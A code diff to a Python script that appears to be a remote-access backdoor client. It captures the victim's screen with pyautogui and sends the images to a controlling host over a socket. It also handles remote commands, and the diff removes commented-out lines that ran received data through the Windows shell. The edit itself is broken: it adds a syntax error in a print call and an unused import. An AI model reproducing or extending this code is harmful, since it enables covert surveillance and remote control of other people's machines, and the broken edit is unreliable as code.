@@ -6,6 +6,7 @@ import sys
 import glob
 import pyautogui
 from PIL import Image
+import random
 
 GENERIC_READ = -2147483648
 FILE_SHARE_WRITE = 2
@@ -48,11 +49,12 @@ try:
               image = Image.open(file)
               new_image = image.resize((1920, 1080))
               new_image.save(file2)
-              file = open(file2, 'rb')
-              data = file.read()
-              client.sendall(data)
-           except:
-                 print("Not enough arguments")
+              with open(file2, 'rb') as img_file:
+              
+                  data = img_file.read()
+                  client.sendall(data)
+           except Exception as e:
+                 print("Error capturing screenshot:", str(e)")
             
         elif command == 'exit':
             sys.exit()  
@@ -106,5 +108,4 @@ try:
 finally:
     client.close()
 
-  #print("Executed : ", data.decode())
-    #os.system('cmd /k' + data.decode()).system('cmd /k' + data.decode())
+
